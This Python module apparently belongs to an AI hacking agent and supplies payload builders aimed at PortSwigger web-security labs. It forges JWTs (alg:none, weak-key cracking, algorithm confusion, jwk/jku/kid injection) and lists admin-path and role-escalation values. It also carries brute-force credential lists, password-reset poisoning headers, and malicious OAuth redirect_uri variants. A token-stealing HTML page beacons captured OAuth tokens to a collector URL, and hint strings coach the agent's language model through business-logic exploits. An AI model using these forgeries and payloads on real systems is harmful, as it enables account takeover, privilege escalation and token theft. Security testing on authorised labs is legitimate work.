"""
=============================================================================
Reynard — Auth / Access-control / Logic deterministic routines
=============================================================================
Reusable, side-effect-free building blocks for the AUTH/ACCESS/LOGIC attack
family (authentication, JWT, OAuth, access-control/IDOR, business logic,
information disclosure), mirroring :mod:`hacking_agent.core.injection`.

Nothing here makes a network call. Every "solver" either builds a payload or
takes an ``oracle`` — a ``Callable`` the caller wires to the live target via
``http_request`` / ``jwt_tool`` — so the algorithms are unit-testable offline
with a fake oracle, exactly as the plan requires.

Contents:
  - JWT: base64url codec, decode/encode, alg:none variants, HMAC signing,
    weak-key cracking, claim tampering, algorithm confusion (RS256->HS256),
    and jwk/jku/kid header-injection builders.
  - Access control: admin-path candidates, admin/deny markers, single-session
    and multi-session (differential) classification, and parameter/role
    escalation payload builders.
  - Authentication: username-enumeration oracles (response-diff, subtly
    different, response-timing, account-lock) and login-outcome detection,
    plus small default word/credential lists for brute force.
  - Information disclosure: backup-file variants, ``.git`` path set + HEAD/
    index detection, and error/debug/version signatures.
  - OAuth: redirect_uri tamper variants + token-theft delivery page.
  - Business logic: price/quantity tamper values (client-side controls,
    negative/overflow, long-input) used by the guided path.
=============================================================================
"""
from __future__ import annotations

import base64
import hashlib
import hmac
import json
import re
from typing import Any, Callable, Iterable

# =============================================================================
# JWT — codec + forging primitives (stdlib only; no PyJWT dependency)
# =============================================================================


def b64url_encode(data: bytes) -> str:
    """URL-safe base64 WITHOUT padding (JWT segment encoding)."""
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode("ascii")


def b64url_decode(segment: str) -> bytes:
    """Decode a (possibly unpadded) URL-safe base64 JWT segment."""
    seg = segment.strip()
    pad = "=" * (-len(seg) % 4)
    return base64.urlsafe_b64decode(seg + pad)


def _encode_json_segment(obj: dict) -> str:
    raw = json.dumps(obj, separators=(",", ":"), sort_keys=False).encode("utf-8")
    return b64url_encode(raw)


def decode_jwt(token: str) -> tuple[dict, dict, str]:
    """Split a JWT into ``(header, payload, signature_b64)``.

    Raises ``ValueError`` if the token is not a well-formed 3-part JWT.
    """
    parts = (token or "").strip().split(".")
    if len(parts) not in (2, 3):
        raise ValueError("not a JWT (expected 2 or 3 dot-separated segments)")
    header = json.loads(b64url_decode(parts[0]) or b"{}")
    payload = json.loads(b64url_decode(parts[1]) or b"{}")
    signature = parts[2] if len(parts) == 3 else ""
    return header, payload, signature


def is_jwt(token: str) -> bool:
    """Best-effort structural JWT check (header decodes to an object w/ alg)."""
    try:
        header, _payload, _sig = decode_jwt(token)
    except (ValueError, json.JSONDecodeError, Exception):
        return False
    return isinstance(header, dict) and "alg" in header


def encode_jwt(header: dict, payload: dict, signature: str = "") -> str:
    """Assemble a JWT from parts. ``signature`` is an already-b64url string."""
    return f"{_encode_json_segment(header)}.{_encode_json_segment(payload)}.{signature}"


def signing_input(header: dict, payload: dict) -> bytes:
    """The bytes an HMAC/RSA signature is computed over (``header.payload``)."""
    return f"{_encode_json_segment(header)}.{_encode_json_segment(payload)}".encode("ascii")


# ----- alg:none (unverified signature / flawed verification) ---------------

# PortSwigger's flawed-verification labs accept several case spellings.
ALG_NONE_SPELLINGS: tuple[str, ...] = ("none", "None", "NONE", "nOnE")


def forge_alg_none(payload: dict, *, alg: str = "none",
                   header_extra: dict | None = None) -> str:
    """Build an unsigned ``alg:none`` token (empty signature segment)."""
    header = {"alg": alg, "typ": "JWT"}
    if header_extra:
        header.update(header_extra)
    return encode_jwt(header, payload, "")


def alg_none_variants(payload: dict) -> list[tuple[str, str]]:
    """Return ``(spelling, token)`` for every alg:none case spelling."""
    return [(alg, forge_alg_none(payload, alg=alg)) for alg in ALG_NONE_SPELLINGS]


# ----- HMAC signing (weak-key + algorithm confusion) -----------------------

_HASHES = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}


def sign_hs(header: dict, payload: dict, key: bytes | str, *,
            alg: str = "HS256") -> str:
    """Return a fully-signed HMAC JWT for ``key``."""
    if isinstance(key, str):
        key = key.encode("utf-8")
    digest = _HASHES.get(alg, hashlib.sha256)
    msg = signing_input(header, payload)
    sig = hmac.new(key, msg, digest).digest()
    return f"{msg.decode('ascii')}.{b64url_encode(sig)}"


def hs_signature(msg: bytes, key: bytes | str, *, alg: str = "HS256") -> str:
    if isinstance(key, str):
        key = key.encode("utf-8")
    digest = _HASHES.get(alg, hashlib.sha256)
    return b64url_encode(hmac.new(key, msg, digest).digest())


def verify_hs(token: str, key: bytes | str, *, alg: str = "HS256") -> bool:
    """True if ``token``'s HMAC signature verifies under ``key``."""
    try:
        header, payload, sig = decode_jwt(token)
    except (ValueError, json.JSONDecodeError):
        return False
    expected = hs_signature(signing_input(header, payload), key, alg=alg)
    return hmac.compare_digest(expected, sig)


def crack_hs_secret(token: str, candidates: Iterable[str],
                    *, alg: str = "HS256") -> str | None:
    """Brute-force an HMAC secret from a candidate wordlist (offline).

    Returns the first candidate whose recomputed signature matches, else None.
    Deterministic mirror of ``jwt_tool -C -d``; used both for tests and as an
    in-process fallback when the container tool is unavailable.
    """
    try:
        header, payload, sig = decode_jwt(token)
    except (ValueError, json.JSONDecodeError):
        return None
    if not sig:
        return None
    msg = signing_input(header, payload)
    token_alg = str(header.get("alg", alg)).upper()
    use_alg = token_alg if token_alg in _HASHES else alg
    for candidate in candidates:
        if hs_signature(msg, candidate, alg=use_alg) == sig:
            return candidate
    return None


def tamper_payload(token: str, updates: dict, *, key: bytes | str | None = None,
                   alg: str = "HS256") -> str:
    """Return ``token`` with ``updates`` merged into the payload.

    If ``key`` is given the token is re-signed (HMAC); otherwise the original
    header is preserved and the signature segment is left empty (use for
    unverified-signature labs).
    """
    header, payload, sig = decode_jwt(token)
    payload = {**payload, **updates}
    if key is not None:
        header = {**header, "alg": alg}
        return sign_hs(header, payload, key, alg=alg)
    return encode_jwt(header, payload, sig)


def algorithm_confusion_token(payload: dict, public_key_pem: str,
                              *, header_extra: dict | None = None) -> str:
    """RS256->HS256 algorithm-confusion forgery.

    Signs a ``HS256`` token using the server's RSA *public* key (the exact PEM
    bytes) as the HMAC secret. If the server confuses the algorithms it will
    verify our HMAC using that same public key.
    """
    header = {"alg": "HS256", "typ": "JWT"}
    if header_extra:
        header.update(header_extra)
    return sign_hs(header, payload, public_key_pem.encode("utf-8")
                   if isinstance(public_key_pem, str) else public_key_pem,
                   alg="HS256")


# ----- header injection (jwk / jku / kid) ----------------------------------


def jwk_header_injection(payload: dict, *, kid: str = "reynard",
                         n: str = "", e: str = "AQAB", key: bytes | str = b"") -> dict:
    """Build a self-signed jwk-injection *plan*.

    Returns a dict describing the embedded JWK header and (HMAC-demo) token so
    the caller/tests can assert structure. Real RSA jwk self-signing is done by
    ``jwt_tool -X i``; this builder documents the header shape deterministically.
    """
    header = {"alg": "RS256", "typ": "JWT",
              "jwk": {"kty": "RSA", "kid": kid, "n": n, "e": e}}
    return {"header": header, "kid": kid,
            "token_stub": encode_jwt(header, payload, "")}


def jku_header(jku_url: str, *, kid: str = "reynard", alg: str = "RS256") -> dict:
    """Header referencing an attacker-hosted JWKS via the ``jku`` claim."""
    return {"alg": alg, "typ": "JWT", "kid": kid, "jku": jku_url}


def kid_path_traversal_header(path: str = "../../../../../../dev/null",
                              *, alg: str = "HS256") -> dict:
    """Header whose ``kid`` points at a predictable file (empty-key signing).

    Signing with an empty key works when ``kid`` resolves to ``/dev/null``.
    """
    return {"alg": alg, "typ": "JWT", "kid": path}


def build_jwks(kid: str, n: str, e: str = "AQAB") -> dict:
    """A minimal single-key JWKS document to host for a jku-injection lab."""
    return {"keys": [{"kty": "RSA", "kid": kid, "use": "sig", "e": e, "n": n}]}


# ----- subvariant routing (which JWT technique to try) ---------------------


def jwt_technique_for(subvariant: str) -> str:
    """Map a lab subvariant string to the primary JWT technique id."""
    s = (subvariant or "").lower().replace("_", " ").replace("-", " ")
    if "algorithm confusion" in s or ("rs" in s and "hs" in s) or "confusion" in s:
        return "algorithm_confusion"
    if "jwk" in s and "jku" not in s:
        return "jwk_injection"
    if "jku" in s:
        return "jku_injection"
    if "kid" in s or "path traversal" in s:
        return "kid_traversal"
    if "weak" in s or "brute" in s or "crack" in s or "signing key" in s:
        return "weak_key"
    if "none" in s or "unverified" in s or "flawed signature" in s:
        return "alg_none"
    # A safe default: unverified-signature tokens are the most common apprentice
    # case and cost nothing to try first.
    return "alg_none"


def jwt_privilege_claims(username: str = "administrator") -> dict:
    """The claim updates that escalate a JWT session to admin on the labs."""
    return {"sub": username, "username": username, "name": username}


# =============================================================================
# Access control / IDOR
# =============================================================================

# Common admin/privileged surfaces PortSwigger hides behind broken access
# control (ordered by how frequently the labs use them).
ADMIN_PATH_CANDIDATES: tuple[str, ...] = (
    "/admin", "/admin/", "/administrator-panel", "/admin-panel",
    "/administrator", "/management", "/admin/delete", "/admin/users",
)

# Markers that a returned body really is a privileged/admin surface.
ADMIN_MARKERS = re.compile(
    r"(admin panel|users?\b.*(delete|role|upgrade)|delete\s*user|"
    r"adminuser|is[-_ ]?admin|administrator|/admin/delete|upgrade to admin)",
    re.I,
)

# Markers that access was denied (login redirect / 401-403 body).
DENY_MARKERS = re.compile(
    r"(not found|forbidden|unauthori[sz]ed|access denied|please log ?in|"
    r"login required|401|403)", re.I,
)


def admin_path_candidates(extra: Iterable[str] | None = None) -> list[str]:
    paths: list[str] = []
    for path in list(extra or []) + list(ADMIN_PATH_CANDIDATES):
        if path and path not in paths:
            paths.append(path)
    return paths


def extract_admin_url_from_source(html_or_js: str) -> str:
    """Find an unpredictable admin URL leaked in HTML/JS (comments / JS vars).

    PortSwigger's "unpredictable URL" lab leaks the admin path inside an
    inline ``<script>`` (e.g. ``adminPanelTag ... '/admin-xyz'``). Return the
    first admin-looking absolute path found, else "".
    """
    for m in re.finditer(r"""["'](/[A-Za-z0-9_\-/]*admin[A-Za-z0-9_\-/]*)["']""",
                         html_or_js or "", re.I):
        return m.group(1)
    # Also handle isAdmin/adminPanel JS var assigned a path-like string.
    m = re.search(r"""admin\w*\s*[:=]\s*["'](/[^"']+)["']""", html_or_js or "", re.I)
    return m.group(1) if m else ""


def find_delete_link(html: str, username: str = "carlos") -> str:
    """Return the admin 'delete user' URL for ``username`` from a panel page."""
    m = re.search(
        rf"""href\s*=\s*["']([^"']*(?:delete|remove)[^"']*{re.escape(username)}[^"']*)["']""",
        html or "", re.I,
    )
    if m:
        return m.group(1)
    m = re.search(
        rf"""["']([^"']*/admin/delete[^"']*username={re.escape(username)}[^"']*)["']""",
        html or "", re.I,
    )
    return m.group(1) if m else ""


def is_denied(status: int, body: str = "") -> bool:
    """True when a response is an access-denied / login-redirect baseline."""
    if status in (401, 403):
        return True
    if status in (301, 302, 303, 307, 308):
        return True
    if status == 404:
        return True
    return bool(DENY_MARKERS.search(body or "")) and not ADMIN_MARKERS.search(body or "")


def is_admin_surface(status: int, body: str = "") -> bool:
    """True when a 2xx response actually exposes an admin/privileged surface."""
    return status == 200 and bool(ADMIN_MARKERS.search(body or ""))


def access_control_differential(
    per_session: dict[str, tuple[int, int, bool]],
    role_of: Callable[[str], str] | None = None,
) -> dict | None:
    """Given ``{session: (status, length, admin_markers)}`` return a broken
    access-control finding when a NON-admin session reaches a surface the
    unauthorized baseline is denied. Generalises the exploitation IDOR probe.
    """
    if not per_session:
        return None
    denied = [
        (name, s) for name, s in per_session.items()
        if s[0] in (401, 403, 404) or (s[0] in (301, 302, 303) and s[1] < 200)
    ]
    baseline_status = denied[0][1][0] if denied else 401
    for name, (status, _length, admin_markers) in per_session.items():
        if status == 200 and admin_markers:
            role = "unknown"
            if role_of is not None:
                try:
                    role = role_of(name) or "unknown"
                except Exception:
                    role = "unknown"
            if role == "admin":
                continue  # admin reaching admin surface is expected
            return {
                "session": name, "role": role, "status": status,
                "baseline_status": baseline_status,
            }
    return None


def role_escalation_param_values(admin_value: str = "true") -> list[tuple[str, str, str]]:
    """(location, key, value) role-escalation candidates for parameter/profile
    based access-control labs (user-role-via-request-parameter,
    role-modifiable-in-profile)."""
    return [
        ("query", "admin", admin_value),
        ("query", "roleid", "2"),
        ("json", "roleid", "2"),
        ("json", "isAdmin", admin_value),
        ("json", "role", "admin"),
    ]


def user_id_param_names() -> tuple[str, ...]:
    """Parameter names that carry a user identifier in IDOR labs."""
    return ("id", "userid", "user_id", "user", "account", "accountId", "customerId")


# URL / method based access-control bypass primitives.
URL_OVERRIDE_HEADERS: tuple[tuple[str, str], ...] = (
    ("X-Original-URL", "{path}"),
    ("X-Rewrite-URL", "{path}"),
)


def url_override_headers(path: str) -> list[tuple[str, str]]:
    return [(h, tpl.format(path=path)) for h, tpl in URL_OVERRIDE_HEADERS]


def method_tamper_variants() -> tuple[str, ...]:
    """HTTP verbs to try for method-based access-control bypass."""
    return ("POST", "POSTX", "GET", "HEAD", "PUT")


# =============================================================================
# Authentication — username enumeration, brute force, login detection
# =============================================================================

DEFAULT_USERNAMES: tuple[str, ...] = (
    "administrator", "admin", "carlos", "wiener", "root", "user", "test",
)
DEFAULT_PASSWORDS: tuple[str, ...] = (
    "password", "123456", "letmein", "admin", "peter", "carlos", "12345678",
)


def detect_login_outcome(status: int, body: str, headers: dict | None = None) -> str:
    """Classify a login response as ``success`` | ``locked`` | ``failure``."""
    headers = headers or {}
    lowered = (body or "").lower()
    if any("set-cookie" in k.lower() and "session" in str(v).lower()
           for k, v in headers.items()):
        return "success"
    if status in (302, 303) and "/login" not in str(headers.get("Location", "")):
        return "success"
    if re.search(r"(you have made too many|locked|try again in|blocked)", lowered):
        return "locked"
    if re.search(r"(log ?out|my-account|welcome back)", lowered):
        return "success"
    return "failure"


def username_enum_by_response(results: dict[str, str]) -> str | None:
    """Return the username whose response text is the odd-one-out.

    Feed ``{username: normalised_response}``. If exactly one response differs
    from all the others, that username is valid (different-responses and
    subtly-different-responses labs).
    """
    if len(results) < 2:
        return None
    norm = {u: _normalise_enum(r) for u, r in results.items()}
    counts: dict[str, int] = {}
    for value in norm.values():
        counts[value] = counts.get(value, 0) + 1
    # Exactly one response must be a singleton outlier, and the remaining
    # responses must form a clear baseline group (count >= 2) — otherwise the
    # difference is ambiguous (e.g. two identities, two distinct messages).
    singletons = [value for value, c in counts.items() if c == 1]
    if len(singletons) != 1:
        return None
    baseline = max((c for value, c in counts.items() if value != singletons[0]),
                   default=0)
    if baseline < 2:
        return None
    for user, value in norm.items():
        if value == singletons[0]:
            return user
    return None


def _normalise_enum(text: str) -> str:
    """Collapse volatile bits (CSRF tokens, whitespace) so only the invalid-
    vs-valid message difference remains."""
    t = (text or "").lower()
    t = re.sub(r"[0-9a-f]{16,}", "", t)          # tokens / ids
    t = re.sub(r"csrf[^<>\s]*", "", t)
    t = re.sub(r"\s+", " ", t)
    return t.strip()


def username_enum_by_timing(timings: dict[str, float],
                            *, factor: float = 1.5) -> str | None:
    """Return the username whose response time is anomalously high.

    For response-timing labs a valid username triggers an expensive password
    hash; its timing sits well above the median of the invalid ones.
    """
    if len(timings) < 3:
        return None
    ordered = sorted(timings.values())
    median = ordered[len(ordered) // 2]
    if median <= 0:
        median = sum(ordered) / len(ordered) or 1e-9
    slowest = max(timings, key=lambda k: timings[k])
    if timings[slowest] >= median * factor:
        # ensure it's a clear outlier, not just noise
        others = [v for k, v in timings.items() if k != slowest]
        if others and timings[slowest] >= max(others):
            return slowest
    return None


def password_reset_poison_headers(attacker_host: str) -> list[tuple[str, str]]:
    """Host-header variants for password-reset-poisoning-via-middleware labs."""
    return [
        ("Host", attacker_host),
        ("X-Forwarded-Host", attacker_host),
        ("X-Forwarded-Server", attacker_host),
        ("X-Host", attacker_host),
    ]


# =============================================================================
# Information disclosure
# =============================================================================

# The files a version-control-history lab exposes under /.git.
GIT_PATHS: tuple[str, ...] = (
    "/.git/HEAD", "/.git/config", "/.git/index",
    "/.git/logs/HEAD", "/.git/ORIG_HEAD",
)


def backup_file_variants(filename: str) -> list[str]:
    """Backup/source-disclosure filename variants (.bak, ~, .old, .swp...)."""
    name = filename.lstrip("/")
    return [
        f"{name}.bak", f"{name}~", f"{name}.old", f"{name}.orig",
        f"{name}.save", f"{name}.swp", f".{name}.swp", f"{name}.txt",
        f"{name}.1", f"{name}.inc",
    ]


def looks_like_git_head(body: str) -> bool:
    """True when a body is a real ``.git/HEAD`` (``ref: refs/heads/...``)."""
    return bool(re.match(r"^\s*ref:\s*refs/heads/", body or ""))


def looks_like_git_index(data: bytes) -> bool:
    """True when bytes look like a git index file (``DIRC`` magic)."""
    return bool(data) and data[:4] == b"DIRC"


ERROR_SIGNATURES = re.compile(
    r"(stack trace|traceback \(most recent call last\)|exception|"
    r"sqlexception|at java\.|at org\.|debug mode|werkzeug|"
    r"caused by:|line \d+, in |ORA-\d{4}|version\s+\d+\.\d+)", re.I,
)


def has_error_disclosure(body: str) -> bool:
    return bool(ERROR_SIGNATURES.search(body or ""))


DEBUG_PATHS: tuple[str, ...] = (
    "/cgi-bin/phpinfo.php", "/phpinfo.php", "/debug", "/status", "/actuator",
    "/actuator/env", "/console", "/server-status",
)


# =============================================================================
# OAuth
# =============================================================================


def redirect_uri_variants(legit_redirect: str, attacker: str) -> list[str]:
    """Malicious ``redirect_uri`` values for account-hijack-via-redirect labs."""
    legit = legit_redirect.rstrip("/")
    return [
        attacker,
        f"{legit}.{attacker.split('//')[-1]}",
        f"{legit}/../{attacker}",
        f"{legit}@{attacker.split('//')[-1]}",
        f"{attacker}/{legit.split('//')[-1]}",
        f"{legit}%2f%2e%2e%2f{attacker.split('//')[-1]}",
    ]


def implicit_flow_email_tamper(token_response: dict, new_email: str) -> dict:
    """For auth-bypass-via-implicit-flow: swap the email in the POSTed profile
    while keeping the (unverified) access token."""
    tampered = dict(token_response)
    tampered["email"] = new_email
    return tampered


def steal_token_page(collector_url: str, *, via_redirect: str = "") -> str:
    """HTML that captures an OAuth token from the URL fragment (implicit flow)
    or via an open-redirect proxy and beacons it to ``collector_url``."""
    redirect_js = (
        f"window.location = '{via_redirect}' + document.location.hash;"
        if via_redirect else
        "new Image().src = '" + collector_url +
        "?t=' + encodeURIComponent(document.location.hash.substr(1));"
    )
    return (
        "<html><body><script>\n"
        f"{redirect_js}\n"
        "</script></body></html>"
    )


def openid_registration_ssrf_body(logo_uri: str, redirect_uri: str,
                                   client_name: str = "reynard") -> dict:
    """Dynamic-client-registration body whose ``logo_uri`` triggers SSRF."""
    return {
        "redirect_uris": [redirect_uri],
        "client_name": client_name,
        "logo_uri": logo_uri,
    }


# =============================================================================
# Business logic
# =============================================================================


def price_tamper_values() -> list[str]:
    """Prices for excessive-trust-in-client-side-controls labs."""
    return ["0", "1", "0.01", "-100"]


def quantity_tamper_values() -> list[int]:
    """Quantities for high/low-level logic (negative + integer overflow)."""
    return [-1, 0, 999999, 2147483647, -2147483648]


def long_input_values(base: str = "a", *, lengths: Iterable[int] = (200, 255, 300)
                      ) -> list[str]:
    """Over-long usernames for inconsistent-handling-of-exceptional-input."""
    return [base * n for n in lengths]


def business_logic_hint(subvariant: str) -> str:
    """Return a tight, technique-specific hint for the guided LLM path."""
    s = (subvariant or "").lower().replace("_", " ").replace("-", " ")
    if "client" in s or "price" in s:
        return ("Excessive trust in client-side controls: intercept the add-to-"
                "cart/checkout request and set the price/quantity to an "
                "attacker value (0, 1, or negative). Re-submit and buy.")
    if "negative" in s or "overflow" in s or "low level" in s:
        return ("Low-level logic flaw: submit a negative or overflowing "
                "quantity to invert the total or wrap an integer, then adjust a "
                "second item so the order total lands in the affordable range.")
    if "infinite" in s or "money" in s or "coupon" in s or "gift" in s:
        return ("Infinite money: chain a gift-card purchase with a stacking "
                "discount code so each redemption nets positive balance; script "
                "the buy->redeem loop until you can afford the target item.")
    if "workflow" in s or "state" in s or "step" in s:
        return ("Insufficient workflow validation / flawed state machine: skip "
                "or reorder a step (e.g. POST the confirm-order step directly, "
                "or drop the payment step) and observe the privileged outcome.")
    if "email" in s or "parsing" in s:
        return ("Email-parsing discrepancy: register with an address whose "
                "encoded/sub-addressed form normalises to the privileged domain "
                "(e.g. unicode/quoted-pair tricks) to gain internal access.")
    if "encryption" in s or "oracle" in s:
        return ("Auth bypass via encryption oracle: find a field the app both "
                "encrypts and decrypts, use it as an oracle to encrypt an "
                "attacker-chosen value (e.g. a forged cookie), then replay it.")
    return ("Business-logic flaw: model the intended workflow, then break one "
            "assumption (trust boundary, value range, step ordering, or dual-"
            "use endpoint) and verify the privileged/free outcome.")
